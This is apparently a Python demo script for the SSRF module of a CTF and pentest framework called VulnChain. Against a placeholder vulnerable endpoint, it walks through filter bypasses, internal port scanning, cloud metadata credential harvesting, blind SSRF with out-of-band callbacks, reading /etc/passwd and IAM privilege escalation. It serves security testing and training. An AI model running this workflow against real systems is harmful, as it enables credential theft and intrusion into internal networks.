"""Demo script for SSRF module

This script demonstrates the usage of the SSRF testing module.
"""

import asyncio
import sys
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from app.modules.ssrf import (
    SSRFTester,
    SSRFExploiter,
    InjectionPoint,
    CloudProvider,
    SSRFType,
)
from app.core.request_handler import RequestHandler
from app.core.oob_listener import OOBListener


async def demo_basic_ssrf_testing():
    """Demonstrate basic SSRF testing"""
    print("=" * 60)
    print("Demo 1: Basic SSRF Testing")
    print("=" * 60)
    
    # Initialize request handler
    request_handler = RequestHandler()
    
    # Initialize SSRF tester
    tester = SSRFTester(request_handler)
    
    # Define injection point (example vulnerable endpoint)
    injection_point = InjectionPoint(
        parameter="url",
        location="query",
        original_value="https://example.com",
        url="http://vulnerable-app.local/fetch",
        method="GET",
        headers={"User-Agent": "VulnChain/1.0"},
    )
    
    print(f"\nTesting injection point: {injection_point.parameter}")
    print(f"Location: {injection_point.location}")
    print(f"Target URL: {injection_point.url}")
    
    # Test for SSRF
    print("\nTesting for SSRF vulnerabilities...")
    results = await tester.test_injection_point(injection_point)
    
    # Display results
    for i, result in enumerate(results, 1):
        print(f"\n--- Result {i} ---")
        print(f"Vulnerable: {result.is_vulnerable}")
        if result.is_vulnerable:
            print(f"SSRF Type: {result.ssrf_type.value}")
            print(f"Target URL: {result.target_url}")
            print(f"Bypass Technique: {result.bypass_technique}")
            print(f"Confidence: {result.confidence:.2%}")
            print(f"\nEvidence:")
            for evidence in result.evidence:
                print(f"  - {evidence}")
    
    await request_handler.close()


async def demo_filter_bypasses():
    """Demonstrate SSRF filter bypass techniques"""
    print("\n" + "=" * 60)
    print("Demo 2: SSRF Filter Bypass Techniques")
    print("=" * 60)
    
    request_handler = RequestHandler()
    tester = SSRFTester(request_handler)
    
    # Generate bypass payloads
    bypasses = tester._generate_localhost_bypasses()
    
    print(f"\nGenerated {len(bypasses)} bypass payloads:")
    print("\nBypass Techniques:")
    
    # Group by technique
    techniques = {}
    for payload, technique in bypasses:
        if technique not in techniques:
            techniques[technique] = []
        techniques[technique].append(payload)
    
    for technique, payloads in techniques.items():
        print(f"\n{technique}:")
        for payload in payloads[:3]:  # Show first 3 examples
            print(f"  - {payload}")
    
    await request_handler.close()


async def demo_port_scanning():
    """Demonstrate internal port scanning via SSRF"""
    print("\n" + "=" * 60)
    print("Demo 3: Internal Port Scanning via SSRF")
    print("=" * 60)
    
    request_handler = RequestHandler()
    tester = SSRFTester(request_handler)
    
    # Define vulnerable injection point
    injection_point = InjectionPoint(
        parameter="url",
        location="query",
        original_value="https://example.com",
        url="http://vulnerable-app.local/fetch",
        method="GET",
    )
    
    print("\nScanning internal ports on 127.0.0.1...")
    print("Ports to scan: 80, 443, 3306, 6379, 8080")
    
    # Scan common ports
    port_results = await tester.scan_internal_ports(
        injection_point,
        target_host="127.0.0.1",
        ports=[80, 443, 3306, 6379, 8080],
    )
    
    print("\nPort Scan Results:")
    print("-" * 60)
    print(f"{'Port':<10} {'Status':<10} {'Service':<15} {'Response Time':<15}")
    print("-" * 60)
    
    for result in port_results:
        status = "OPEN" if result.is_open else "CLOSED"
        service = result.service or "Unknown"
        response_time = f"{result.response_time:.3f}s"
        print(f"{result.port:<10} {status:<10} {service:<15} {response_time:<15}")
        
        if result.banner:
            print(f"  Banner: {result.banner[:60]}...")
    
    await request_handler.close()


async def demo_cloud_metadata():
    """Demonstrate cloud metadata testing"""
    print("\n" + "=" * 60)
    print("Demo 4: Cloud Metadata Service Testing")
    print("=" * 60)
    
    request_handler = RequestHandler()
    tester = SSRFTester(request_handler)
    
    # Define vulnerable injection point
    injection_point = InjectionPoint(
        parameter="url",
        location="query",
        original_value="https://example.com",
        url="http://vulnerable-app.local/fetch",
        method="GET",
    )
    
    print("\nTesting cloud metadata endpoints...")
    print("Providers: AWS, Azure, GCP")
    
    # Test cloud metadata
    cloud_results = await tester.test_cloud_metadata(
        injection_point,
        providers=[CloudProvider.AWS, CloudProvider.AZURE, CloudProvider.GCP],
    )
    
    print("\nCloud Metadata Results:")
    print("-" * 60)
    
    for result in cloud_results:
        print(f"\nProvider: {result.provider.value.upper()}")
        print(f"Endpoint: {result.endpoint}")
        print(f"Accessible: {result.accessible}")
        
        if result.accessible:
            print(f"Data preview: {result.data[:100]}...")
            if result.credentials:
                print("Credentials found:")
                for key, value in result.credentials.items():
                    # Mask sensitive values
                    masked_value = value[:10] + "..." if len(value) > 10 else value
                    print(f"  {key}: {masked_value}")
    
    await request_handler.close()


async def demo_oob_blind_ssrf():
    """Demonstrate blind SSRF with OOB callbacks"""
    print("\n" + "=" * 60)
    print("Demo 5: Blind SSRF with OOB Callbacks")
    print("=" * 60)
    
    # Initialize OOB listener
    oob_listener = OOBListener(
        http_port=8888,
        dns_port=5353,  # Non-privileged port for demo
        domain="oob.example.com",
    )
    
    print("\nStarting OOB listener...")
    print(f"HTTP Port: {oob_listener.http_port}")
    print(f"DNS Port: {oob_listener.dns_port}")
    print(f"Domain: {oob_listener.domain}")
    
    try:
        await oob_listener.start()
        print("OOB listener started successfully")
    except Exception as e:
        print(f"Note: OOB listener start failed (expected in demo): {e}")
        print("Continuing with demo...")
    
    # Initialize request handler and tester
    request_handler = RequestHandler()
    tester = SSRFTester(request_handler, oob_listener=oob_listener)
    
    # Define injection point
    injection_point = InjectionPoint(
        parameter="url",
        location="query",
        original_value="https://example.com",
        url="http://vulnerable-app.local/fetch",
        method="GET",
    )
    
    # Generate OOB payloads
    unique_id = oob_listener.generate_unique_id()
    http_url = oob_listener.get_callback_url(unique_id)
    dns_hostname = oob_listener.get_dns_callback(unique_id)
    
    print(f"\nGenerated OOB payloads:")
    print(f"HTTP Callback URL: {http_url}")
    print(f"DNS Callback Hostname: {dns_hostname}")
    
    print("\nIn a real scenario:")
    print("1. Send SSRF payload with OOB URL")
    print("2. Wait for callback from vulnerable server")
    print("3. Correlate callback with payload using unique ID")
    print("4. Confirm blind SSRF vulnerability")
    
    # Cleanup
    await oob_listener.stop()
    await request_handler.close()


async def demo_ssrf_exploiter():
    """Demonstrate SSRF exploitation"""
    print("\n" + "=" * 60)
    print("Demo 6: SSRF Exploitation")
    print("=" * 60)
    
    request_handler = RequestHandler()
    tester = SSRFTester(request_handler)
    
    # Simulate a confirmed SSRF vulnerability
    from app.modules.ssrf import SSRFResult
    
    injection_point = InjectionPoint(
        parameter="url",
        location="query",
        original_value="https://example.com",
        url="http://vulnerable-app.local/fetch",
        method="GET",
    )
    
    ssrf_result = SSRFResult(
        injection_point=injection_point,
        is_vulnerable=True,
        ssrf_type=SSRFType.DIRECT,
        target_url="http://127.0.0.1",
        payload="http://127.0.0.1",
        confidence=0.95,
        bypass_technique="basic_localhost",
    )
    
    # Create exploiter
    exploiter = SSRFExploiter(request_handler, injection_point, ssrf_result)
    
    print("\nSSRF Exploiter initialized")
    print(f"Vulnerable parameter: {injection_point.parameter}")
    print(f"SSRF type: {ssrf_result.ssrf_type.value}")
    
    print("\nAvailable exploitation methods:")
    print("1. Read local files (file:// protocol)")
    print("2. Scan internal network")
    print("3. Exploit cloud metadata")
    print("4. Access internal services")
    
    print("\nExample: Reading /etc/passwd")
    print("Command: await exploiter.read_file('/etc/passwd')")
    
    print("\nExample: Scanning internal network")
    print("Command: await exploiter.scan_network('192.168.1.0/24', ports=[80, 443])")
    
    print("\nExample: Exploiting AWS metadata")
    print("Command: await exploiter.exploit_cloud(CloudProvider.AWS)")
    
    await request_handler.close()


async def demo_iam_privilege_escalation():
    """Demonstrate IAM privilege escalation testing"""
    print("\n" + "=" * 60)
    print("Demo 7: IAM Privilege Escalation Testing")
    print("=" * 60)
    
    request_handler = RequestHandler()
    tester = SSRFTester(request_handler)
    
    injection_point = InjectionPoint(
        parameter="url",
        location="query",
        original_value="https://example.com",
        url="http://vulnerable-app.local/fetch",
        method="GET",
    )
    
    # Simulate obtained credentials
    aws_credentials = {
        "access_key_id": "AKIAIOSFODNN7EXAMPLE",
        "secret_access_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "token": "AQoDYXdzEJr...",
    }
    
    print("\nTesting for IAM privilege escalation...")
    print("Provider: AWS")
    print("Credentials obtained from metadata service")
    
    # Test privilege escalation
    findings = await tester.test_iam_privilege_escalation(
        injection_point,
        CloudProvider.AWS,
        aws_credentials,
    )
    
    print("\nPrivilege Escalation Findings:")
    print("-" * 60)
    print(f"Provider: {findings['provider']}")
    print(f"Vulnerable: {findings['vulnerable']}")
    
    if findings['escalation_paths']:
        print("\nPotential Escalation Paths:")
        for path in findings['escalation_paths']:
            print(f"\n  {path['name']}")
            print(f"  Description: {path['description']}")
    
    await request_handler.close()


async def main():
    """Run all demos"""
    print("\n" + "=" * 60)
    print("SSRF Module Demonstration")
    print("=" * 60)
    print("\nThis demo showcases the SSRF testing capabilities")
    print("of the VulnChain CTF Framework.")
    print("\nNote: These demos use simulated vulnerable endpoints.")
    print("In real scenarios, ensure you have authorization to test.")
    
    try:
        # Run demos
        await demo_basic_ssrf_testing()
        await demo_filter_bypasses()
        await demo_port_scanning()
        await demo_cloud_metadata()
        await demo_oob_blind_ssrf()
        await demo_ssrf_exploiter()
        await demo_iam_privilege_escalation()
        
        print("\n" + "=" * 60)
        print("Demo completed successfully!")
        print("=" * 60)
        
    except Exception as e:
        print(f"\nError during demo: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    asyncio.run(main())
